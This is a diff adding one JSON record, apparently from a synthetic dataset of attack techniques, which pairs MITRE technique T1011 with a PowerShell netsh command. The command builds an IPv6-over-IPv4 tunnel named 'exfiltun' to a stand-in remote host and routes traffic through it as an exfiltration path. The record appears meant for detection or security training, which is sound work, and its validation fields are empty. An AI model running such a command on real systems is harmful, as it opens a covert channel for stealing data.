@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh interface ipv6 add v6v4tunnel exfiltun 192.0.2.25 198.51.100.25; netsh interface ipv6 add address exfiltun 2001:db8:100:1::2; netsh interface ipv6 add route 2001:db8:200::/48 exfiltun 2001:db8:100:1::1",
+  "explanation": "Creates a manual IPv6-over-IPv4 tunnel, assigns an IPv6 address, and routes a specific IPv6 prefix through it, establishing a controlled alternate exfiltration path (T1011).",
+  "rationale_steps": [
+    "Set up a named v6v4 tunnel to a remote host.",
+    "Bind an IPv6 address to the tunnel interface.",
+    "Add a targeted IPv6 route to steer exfil traffic through the tunnel using non-default addressing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-8444f983",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
